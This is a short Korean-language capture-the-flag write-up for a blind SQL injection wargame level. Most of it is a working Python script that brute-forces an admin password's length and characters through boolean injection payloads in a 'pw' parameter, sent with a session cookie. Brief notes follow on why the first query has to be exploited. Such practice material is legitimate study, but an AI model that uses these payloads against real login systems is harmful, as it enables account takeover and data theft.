- Blind SQL 문제
# Payload
```python
import requests
import time
import string
import sys

URL = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
MAX_LEN = 32
COOKIES = {"PHPSESSID": "ql3tqlmum5mkma8kd3as04ppph"}

for i in range(1, MAX_LEN):
    r = requests.get(
        URL,
        params={"pw": f"0' or id='admin' and length(pw)={i} -- '"},
        cookies=COOKIES
    )
    print(f"Trying length {i}...")
    if("<h2>Hello admin</h2>" in r.text):
        print(f"[Found] Password length is {i}")
        MAX_LEN = i
        break

def check_char(pos, ch):
    payload = f"0' or id='admin' and substr(pw,{pos},1)='{ch}"
    try:
        r = requests.get(URL, params={"pw": payload}, timeout=10, cookies=COOKIES)
        print(f"현재 시도중: payload = {payload}, pos={pos}, ch='{ch}'", end='\n', flush=True)
    except Exception as e:
        print(f"요청 실패: {e}", file=sys.stderr)
        return False
    # "Hello admin"이 두 번 이상이면 조건이 참이라고 판단
    return r.text.count("Hello") >= 2

def extract_password():
    found = ""
    for pos in range(1, MAX_LEN + 1):
        matched = False
        for ch in CHARSET:
            if check_char(pos, ch):
                found += ch
                matched = True
                print(f"pos {pos}: {ch} (현재: {found})")
                break
            
        if not matched:
            print(f"문자 없음(pos={pos}). 비밀번호 추출 종료.")
            break
    return found

if __name__ == "__main__":
    print("시작: Blind SQLi 문자 추출")
    pwd = extract_password()
    print(f"추출된 비밀번호: {pwd}")

```
- 수작업으로 할 수는 없으니 파이썬으로 자동화하여 브루트포싱 해야 한다.
- PW 파라미터를 조작하여 SQL문의 조건을 항상 거짓으로 만든 다음, OR문으로 이제 내가 검색하고 싶은 것을 확인한다.
- 문제 제약조건
	- 첫 번째 쿼리에서는 admin 유저의 pw값을 몰라도 조건만 맞으면 로그인이 성공하는지 여부를 확인할 수 있다.
	- 두 번째 쿼리에서는 admin 유저의 pw값을 정확하게 알아야 플래그를 획득할 수 있다.
	- `addslashes` 함수가 우회하는 것을 막기 때문에, 두 번째 쿼리는 정직하게 비밀번호를 찾아와야만 뚫을 수 있다.
	- 이를 위해 첫 번째 쿼리의 SQL Injection을 활용해서 admin 계정의 비밀번호를 알아 와야 한다.
- PHP세션 ID를 쿠키로 주지 않으면 패스워드가 맞는지 여부를 확인할 수 없기 때문에, 파이썬으로 request를 보낼 때 쿠키 값을 같이 붙여서 보내야 한다.
- 